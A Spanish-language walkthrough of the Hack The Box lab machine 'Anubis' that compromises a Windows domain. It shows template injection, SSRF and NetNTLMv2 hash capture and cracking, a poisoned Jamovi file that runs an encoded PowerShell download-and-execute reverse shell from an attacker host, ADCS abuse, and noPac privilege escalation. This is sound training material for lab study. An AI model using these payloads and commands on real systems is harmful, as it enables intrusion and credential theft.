---
layout: post
title: Anubis
date: 2023-01-29
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE, eCPPTxv2, OSCP (Escalada), OSEP (Escalada)]
---
___

<center><img src="/writeups/assets/img/Anubis-htb/Anubis_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inspección de certificado SSL

* ASP STTI

* Inspección de certificado CSR

* Remote Port Forwarding

* Manipulación URLs

* Enumeración por SMB

* Inyección de comandos NodeJs

* Abuso del servicio de creación de certificados de Microsoft Active Directory

* Búsqueda de templates vulnerables (certify.exe)

* XXS (Node.js) + RCE

* Remote Port Forwarding

* Pivoting

* SSRF

* Análisis de tráfico de paquetes con Wireshark

* Redireccionamiento de autenticación (NetNTLMv2)

* Enumeración de certificados existentes

* Creación y petición de certificados (ADCS.ps1)

* Dumpeo de hash NT con Rubeus (Fallido)

* CVE-2021-42287 (noPac.py)

* PassTheHash

***

# Reconocimiento

## Escaneo de puertos con nmap

### Puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -vvv -sS 10.10.11.102 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-29 08:44 GMT
Initiating SYN Stealth Scan at 08:44
Scanning 10.10.11.102 [65535 ports]
Discovered open port 445/tcp on 10.10.11.102
Discovered open port 135/tcp on 10.10.11.102
Discovered open port 443/tcp on 10.10.11.102
Discovered open port 593/tcp on 10.10.11.102
Discovered open port 49715/tcp on 10.10.11.102
Completed SYN Stealth Scan at 08:44, 26.87s elapsed (65535 total ports)
Nmap scan report for 10.10.11.102
Host is up, received user-set (0.16s latency).
Scanned at 2023-01-29 08:44:04 GMT for 27s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE        REASON
135/tcp   open  msrpc          syn-ack ttl 127
443/tcp   open  https          syn-ack ttl 126
445/tcp   open  microsoft-ds   syn-ack ttl 127
593/tcp   open  http-rpc-epmap syn-ack ttl 127
49715/tcp open  unknown        syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.99 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 21 (924B)
```

### Servicios y versiones

## Puerto 445 (SMB)

Con crackmapexec aplico un escaneo para ver el dominio, hostname y versiones

```null
crackmapexec smb 10.10.11.102
SMB         10.10.11.102    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
```

Pruebo a listar recursos compartidos, pero no tengo acceso

```null
smbmap -H 10.10.11.102 -u 'null'
[!] Authentication error on 10.10.11.102
```

## Puerto 443 (HTTPS)

Con openssl, inspecciono el certificado y puedo ver un subdominio

```null
openssl s_client -connect 10.10.11.102:443 | grep CN
Can't use SSL_get_servername
depth=0 CN = www.windcorp.htb
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = www.windcorp.htb
verify return:1
 0 s:CN = www.windcorp.htb
   i:CN = www.windcorp.htb
subject=CN = www.windcorp.htb
issuer=CN = www.windcorp.htb
```

Los añado al /etc/hosts

```null
echo '10.10.11.102 www.windcorp.htb windcorp.htb' >> /etc/hosts
```

La página principal tiene el siguiente aspecto:

<img src="/writeups/assets/img/Anubis-htb/1.png" alt="">

En la sección de contacto, hay un formulario que puedo tratar de rellenar

<img src="/writeups/assets/img/Anubis-htb/2.png" alt="">

Si pongo cualquier cosa, mi input se ve reflejado en el output, por lo que podría probar a efectuar un SSTI teniendo en cuenta que la web está montada bajo ASP. En [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), contemplan varias formas de ejecutar comandos.

<img src="/writeups/assets/img/Anubis-htb/3.png" alt="">

Hago una inyección de prueba, que se encargue de imprimir la fecha por pantalla con ***<%= response.write(date()) %>***, que en este caso aplica

<img src="/writeups/assets/img/Anubis-htb/4.png" alt="">

Sincronizo mi reloj con el DC

```null
ntpdate -s 
```

En caso de que no la cambie, se puede reinciar el servicio del tiempo o introducirlo de forma manual

```null
timedatectl set-ntp off
timedatectl set-timezone 'GMT'
date --set="$(curl -s -X GET https://10.10.11.102 -k -I | grep -i date | cut -d' ' -f2-)"
```

Modifico el script de Invoke-Powershell.ps1 de nishang para que me entable la reverse shell una vez me lo interprete

```null
cat Invoke-PowerShellTcp.ps1 | tail -n 1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443
```

Envió un nuevo payload que se encargue de enviarme una reverse shell a una sesión en escucha por netcat

<img src="/writeups/assets/img/Anubis-htb/5.png" alt="">

Y gano acceso, pero a un contenedor

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.102.
Ncat: Connection from 10.10.11.102:49922.
Windows PowerShell running as user WEBSERVER01$ on WEBSERVER01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
nt authority\system
PS C:\windows\system32\inetsrv> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Ethernet):

   Connection-specific DNS Suffix  . : htb
   Link-local IPv6 Address . . . . . : fe80::1d8e:ef1f:6c6:69be%32
   IPv4 Address. . . . . . . . . . . : 172.21.97.47
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 172.21.96.1
PS C:\windows\system32\inetsrv> hostname
webserver01
PS C:\windows\system32\inetsrv> 
```

Como el servidor DNS principal y puerta de enlace predeterminada está apuntando a otra IP, supongo que estoy en un entorno de directorio activo donde tengo que llegar hasta el DC, pero desde mi equipo no tengo acceso. Para ello me envío otra reverse shell y desde ella me ejecuto el chisel para crear un proxy por SOCKS5

Desde mi equipo, creo el servidor

```null
su rubbx
chisel server --reverse -p 1234 --socks5
2023/01/29 10:50:25 server: Reverse tunnelling enabled
2023/01/29 10:50:25 server: Fingerprint 0AgxuONq+OQe8xL933rUSFqVL4kC9Hr27TyWHzk46Ms=
2023/01/29 10:50:25 server: Listening on http://0.0.0.0:1234
2023/01/29 10:50:25 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Subo el binario compilado al contenedor y creo la conexión

```null
PS C:\Temp> iwr -uri http://10.10.14.10/chisel.exe -o chisel.exe
PS C:\Temp> ./chisel.exe client 10.10.14.10:1234 R:127.0.0.1:socks
```

En el escritorio del usuario Administrador hay un Certificate Signing Request. Lo utilizaré para la escalada

```null
PS C:\Users\Administrator\Desktop> type req.txt
-----BEGIN CERTIFICATE REQUEST-----
MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
4TlwpQ==
-----END CERTIFICATE REQUEST-----
```

Si lo examinio en local, puedo ver un nuevo CN

```null
openssl req -in req.txt -text | grep CN
        Subject: C = AU, ST = Some-State, O = WindCorp, CN = softwareportal.windcorp.htb
```

Lo añado el etc/hosts, pero apuntando a la IP del contenedor no resuelve a ningún sitio. Pero como tengo el túnel montado, podría tratar de crear un proxy y apuntar a la IP del Domain Controller en el /etc/hosts

```null
echo '172.21.96.1 softwareportal.windcorp.htb' >> /etc/hosts
```

Desde proxychains, creo un nuevo proxy

<img src="/writeups/assets/img/Anubis-htb/6.png" alt="">

Como tira de recursos externos, hay que añadirle una configuración especial y desactivar la resolución DNS

<img src="/writeups/assets/img/Anubis-htb/7.png" alt="">

<img src="/writeups/assets/img/Anubis-htb/8.png" alt="">

Ahora ya carga la web y tiene el siguiente aspecto:

<img src="/writeups/assets/img/Anubis-htb/9.png" alt="">

Al hacer hovering sobre los productos, se puede ver la URL a donde apuntan

<img src="/writeups/assets/img/Anubis-htb/10.png" alt="">

<img src="/writeups/assets/img/Anubis-htb/11.png" alt="">

Tramito una petición pero cambiando la IP que viene por la mía y con Wireshark me quedo en escucha de tráfico de paquetes por la interfaz tun0. Se está tramitando una autenticación hacia mi puerto 5985, que corresponde al winrm, por lo que viaja un hash NetNTLMv2 por detrás que puedo tratar de interceptar con Responder

```null
proxychains curl 'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.10&software=7z1900-x64.exe'
```

<img src="/writeups/assets/img/Anubis-htb/12.png" alt="">

```null
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

[+] Listening for events...

[WinRM] NTLMv2 Client   : 10.10.11.102
[WinRM] NTLMv2 Username : windcorp\localadmin
[WinRM] NTLMv2 Hash     : localadmin::windcorp:042476b70782a29f:ADAFBF631441F05404D21C82280F6C3C:01010000000000003BC1F98CD133D9014577BFD7F5162349000000000200080049004F003800350001001E00570049004E002D0057004C005A004E0058005600410044003900560051000400140049004F00380035002E004C004F00430041004C0003003400570049004E002D0057004C005A004E0058005600410044003900560051002E0049004F00380035002E004C004F00430041004C000500140049004F00380035002E004C004F00430041004C000800300030000000000000000000000000210000FA59A4DA4A6AE7ABBB168590E8A5D38218B9C56B67323EE8D04696D45EA6F5690A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00310030000000000000000000
```

Teniendo el hash, puedo tratar de crackearlo y conseguir la contraseña para ese usuario

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Secret123        (localadmin)     
1g 0:00:00:00 DONE (2023-01-29 11:06) 1.204g/s 2521Kp/s 2521Kc/s 2521KC/s Smudge2..SaS1993
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Pero a pesar de ello no puedo ganar acceso al sistema por winrm

```null
proxychains crackmapexec winrm 172.21.96.1 -u 'localadmin' -p 'Secret123'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
SMB         172.21.96.1     5985   EARTH            [*] Windows 10.0 Build 17763 (name:EARTH) (domain:windcorp.htb)
HTTP        172.21.96.1     5985   EARTH            [*] http://172.21.96.1:5985/wsman
WINRM       172.21.96.1     5985   EARTH            [-] windcorp.htb\localadmin:Secret123
```

De antes no había podido listar los recursos compartidos, así que lo hago ahora que tengo credenciales válidas

```null
smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123'
[+] IP: 10.10.11.102:445	Name: www.windcorp.htb                                  
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
```

Destaca el directorio de certificados del Directorio Activo, y yo de antes tenía un CSR. Pero no tengo acceso de momento

```null
smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' -r 'Active Directory Certificate Services share'
[+] IP: 10.10.11.102:445	Name: www.windcorp.htb                                  
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Active Directory Certificate Services share       	NO ACCESS	
```

Dentro de Shared, hay un subdirectorio que contiene varios archivos con extensión OMV

```null
smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' -r 'Shared/Documents/Analytics'
[+] IP: 10.10.11.102:445	Name: www.windcorp.htb                                  
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Shared                                            	READ ONLY	
	.\SharedDocuments\Analytics\*
	dr--r--r--                0 Thu Apr 29 14:50:33 2021	.
	dr--r--r--                0 Thu Apr 29 14:50:33 2021	..
	fr--r--r--             6455 Thu Apr 29 14:50:33 2021	Big 5.omv
	fr--r--r--             2897 Thu Apr 29 14:50:33 2021	Bugs.omv
	fr--r--r--             2142 Thu Apr 29 14:50:33 2021	Tooth Growth.omv
	fr--r--r--             2841 Sun Jan 29 11:01:16 2023	Whatif.omv
```

Al buscar por esté tipo de extensión en Google, encontré un artículo que hacía referencia a documentos Jamovi

<img src="/writeups/assets/img/Anubis-htb/13.png" alt="">

Ciertas versiones son vulnerables a un XSS en el framework ElectronJs, que utiliza por detrás NodeJs y existen formas de entablarse una reverse shell a través de esta tecnología. En [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs), explican como hacerlo

<img src="/writeups/assets/img/Anubis-htb/14.png" alt="">

<img src="/writeups/assets/img/Anubis-htb/15.png" alt="">

Me descargo uno de esos ficheros para ver como están formados

```null
smbmap -H 10.10.11.102 -u 'localadmin' -p 'Secret123' --download 'Shared/Documents/Analytics/Whatif.omv'
```

Si analizo que tipo de archivo es en función de los magic numbers, me detecta que es un comprimido

```null
file Whatif.omv
Whatif.omv: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Por tanto, puedo descomprimirlo, modificar el nombre de la columna, que es el campo vulnerable y lo vuelvo a componer.

```null
unzip Whatif.omv -d Whatif
Archive:  Whatif.omv
  inflating: Whatif/META-INF/MANIFEST.MF  
  inflating: Whatif/index.html       
  inflating: Whatif/metadata.json    
  inflating: Whatif/xdata.json       
  inflating: Whatif/data.bin         
  inflating: Whatif/01 empty/analysis  
```

Dentro hay un archivo de metadatos en JSON. Si lo abro y filtro por name, encuentro la columna que es más probable a ser vulnerable

```null
cat metadata.json | jq | grep -i name
        "name": "Sepal.Length",
        "importName": "Sepal.Length",
        "name": "Sepal.Width",
        "importName": "Sepal.Width",
        "name": "Petal.Length",
        "importName": "Petal.Length",
        "name": "Petal.Width",
        "importName": "Petal.Width",
        "name": "Species",
        "importName": "Species",
```

A modo de traza, intento cargar un script que esté alojado de mi lado. Es importante escapar las dobles comillas para que no las interprete

```null
cat metadata.json | jq | grep -i name | grep script
        "name": "<script src=\"http://10.10.14.10/pwned.js\"></script>",
```

Creo el comprimido

```null
zip -r Whatif.omv *
```

Y el archivo en javascript que se encargue de enviarme la reverse shell, en base64 con el encoder utf-16le

```null
echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.10/Invoke-PowerShellTcp.ps1")' | iconv -t utf-16le | base64 -w 0 | xclip -sel clip
```

Y así queda

```null
require('child_process').exec('cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQAKAA==')
```

Con SmbClient me conecto al recurso compartido

```null
smbclient //10.10.11.102/Shared/ -U 'localadmin%Secret123'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Apr 28 15:06:06 2021
  ..                                  D        0  Wed Apr 28 15:06:06 2021
  Documents                           D        0  Tue Apr 27 04:09:25 2021
  Software                            D        0  Thu Jul 22 18:14:16 2021

		9034239 blocks of size 4096. 3244986 blocks available
smb: \> 

```

Borro y subo mi fichero

```null
smb: \> cd Documents
smb: \Documents\> cd Analytics\
smb: \Documents\Analytics\> put Whatif.omv
putting file Whatif.omv as \Documents\Analytics\Whatif.omv (24.8 kb/s) (average 24.8 kb/s)
```

Y gano acceso al sistema

```null
rlwrap nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.102.
Ncat: Connection from 10.10.11.102:50753.
Windows PowerShell running as user diegocruz on EARTH
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::699a:78f7:93de:fb19
   Link-local IPv6 Address . . . . . : fe80::699a:78f7:93de:fb19%12
   IPv4 Address. . . . . . . . . . . : 10.10.11.102
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Ethernet adapter vEthernet (nat):

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::fda9:dd18:b1a7:b7d6%18
   IPv4 Address. . . . . . . . . . . : 172.21.96.1
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 
PS C:\Windows\system32> whoami
windcorp\diegocruz
```

Puedo visualizar la primera flag

```null
PS C:\Users\diegocruz\Desktop> type user.txt
a6e8b2d478e94414a290cfedc33000fb
```

# Escalada

No tengo ningún privilegio especial

```null
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Pertenezco al grupo webdevelopers

```null
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\> whoami
windcorp\diegocruz
PS C:\> net user diegocruz
User name                    DiegoCruz
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 5:42:38 PM
Password expires             Never
Password changeable          5/27/2021 5:42:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   1/29/2023 10:27:47 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *webdevelopers        
The command completed successfully.
```

Como tengo un CSR y había visto un directorio compartido haciendo referencia a los certificados del Directorio Activo, podría tratar de enumerar templates que sean vulnerables y así obtener un hash NT y hacer PassTheHash

Me transfiero el certify.exe y el Rubeus.exe a la máquina víctima

```null
PS C:\Users\diegocruz\Desktop> iwr -uri http://10.10.14.10:8000/Rubeus.exe -o Rubeus.exe
PS C:\Users\diegocruz\Desktop> iwr -uri http://10.10.14.10:8000/Certify.exe -o Certify.exe
```

Encuentro un template vulnerable

```null
PS C:\Users\diegocruz\Desktop> .\Certify.exe find /vulnerable /currentuser

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate templates
[*] Using current user's unrolled group SIDs for vulnerability checks.
[*] Using the search base 'CN=Configuration,DC=windcorp,DC=htb'

[*] Listing info about the Enterprise CA 'windcorp-CA'

    Enterprise CA Name            : windcorp-CA
    DNS Hostname                  : earth.windcorp.htb
    FullName                      : earth.windcorp.htb\windcorp-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=windcorp-CA, DC=windcorp, DC=htb
    Cert Thumbprint               : 280458EB20AE6B8A8FFE9B428A5078094F91B3E8
    Cert Serial                   : 3645930A75C5C8BA4AAC0A5C883DEE60
    Cert Start Date               : 5/24/2021 7:48:07 PM
    Cert End Date                 : 5/24/2036 7:58:07 PM
    Cert Chain                    : CN=windcorp-CA,DC=windcorp,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
      Allow  ManageCA, ManageCertificates               WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!

    CA Name                               : earth.windcorp.htb\windcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
        All Extended Rights         : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
      Object Control Permissions
        Owner                       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
        Full Control Principals     : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteOwner Principals       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteDacl Principals        : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteProperty Principals    : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290



Certify completed in 00:00:12.5182225
```

Como tiene el atributo ENROLLEE_SUPPLIES_SUBJECT puedo tratar de crear un nuevo certificado a partir de un principal ya existente en el sistema y pasarselo a Rubeus para obtener un hash NT del usuario Administrador. Para poder crearlo necesito importar ADCS.ps1 a la máquina (Active Directory Cerficate Services) y PowerView.ps1

```null
PS C:\Users\diegocruz\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10:8000/PowerView.ps1')
```

Esta máquina tiene un problema y es que a la hora de extraer el dominio de cada principal lo hace por los CN, pero en el userprincipal name está definido otro, por lo que al importar ADCS.ps1 no va a funcionar y es necesario modificarlo

Donde pone userprincipalname, que no corresponde con el dominio actual, lo sustituyo por samaccountname que no debería dar problema

<img src="/writeups/assets/img/Anubis-htb/16.png" alt="">

Lo importo

```null
PS C:\Users\diegocruz\Desktop> curl http://10.10.14.10:8000/ADCS.ps1 -o ADCS.ps1
PS C:\Users\diegocruz\Desktop> Import-Module .\ADCS.ps1
```

Y lo ejecuto

```null
Get-SmartCardCertificate -Identity Administrator -TemplateName web -NoSmartCard -Verbose
```

Valido que lo haya creado sin problemas

```null
PS C:\Users\diegocruz\Desktop> gci cert:\currentuser\my


   PSParentPath: Microsoft.PowerShell.Security\Certificate::currentuser\my

Thumbprint                                Subject                                                                      
----------                                -------                                                                      
F52A69DE4A6F654097422754629CA33AD314F1E0                                                                               
```

Pero a la hora de obtener el hash NT, da un pete (Fue parcheada la máquina, esta no era la vía intencionada)

```null
PS C:\Users\diegocruz\Desktop> .\Rubeus.exe asktgt /user:Administrator /certificate:F52A69DE4A6F654097422754629CA33AD314F1E0 /getcredentials

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject:  
[*] Building AS-REQ (w/ PKINIT preauth) for: 'windcorp.htb\Administrator'
[*] Using domain controller: fe80::699a:78f7:93de:fb19%12:88

[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP

```

Busco el error en google y encuentro una forma alternativa de resolver la máquina. En este [artículo](https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds) explican como es posible burlar la verificación de Kerberos para el atributo Computer Account Names, que suelen acabar en "$", pero no está sanitizado del todo, pudiendo renombrarlo a un principal administrador del dominio. Como ya tengo credenciales, podría tratar de convertir mi usuario ya pwneado en Administrador del Domain Admin

Hay una herramienta que te lo automatiza llamada [noPac](https://github.com/Ridter/noPac)

```null
git clone https://github.com/Ridter/noPac
pip3 install -r requirements.txt
```

Valido que es funcional

```null
proxychains python3 scanner.py windcorp.htb/localadmin:Secret123 -dc-ip 172.21.96.1 -use-ldap
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.21.96.1. Ticket size 1480
[*] Got TGT from 172.21.96.1. Ticket size 715
```

Como llega obtener el TGT, puedo tratar de almacenarlo en un archivo .ccache para exportarlo a la variable K5B5CCNAME y conectarme a la máquina víctima sin proporcionar contraseña, aunque lo automatiza y es más comodo

```null
proxychains python3 noPac.py windcorp.htb/localadmin:Secret123 -dc-ip 172.21.96.1 -dc-host earth -shell --impersonate Administrator
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target EARTH.windcorp.htb
[*] will try to impersonate Administrator
[*] Adding Computer Account "WIN-3CI2AMTZI6D$"
[*] MachineAccount "WIN-3CI2AMTZI6D$" password = DEUT6Hq!kwBw
[*] Successfully added machine account WIN-3CI2AMTZI6D$ with password DEUT6Hq!kwBw.
[*] WIN-3CI2AMTZI6D$ object = CN=WIN-3CI2AMTZI6D,CN=Computers,DC=windcorp,DC=htb
[*] WIN-3CI2AMTZI6D$ sAMAccountName == EARTH
[*] Saving a DC's ticket in EARTH.ccache
[*] Reseting the machine account to WIN-3CI2AMTZI6D$
[*] Restored WIN-3CI2AMTZI6D$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] Saving a user's ticket in Administrator.ccache
[*] Rename ccache to Administrator_EARTH.windcorp.htb.ccache
[*] Attempting to del a computer with the name: WIN-3CI2AMTZI6D$
[-] Delete computer WIN-3CI2AMTZI6D$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
earth

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::699a:78f7:93de:fb19
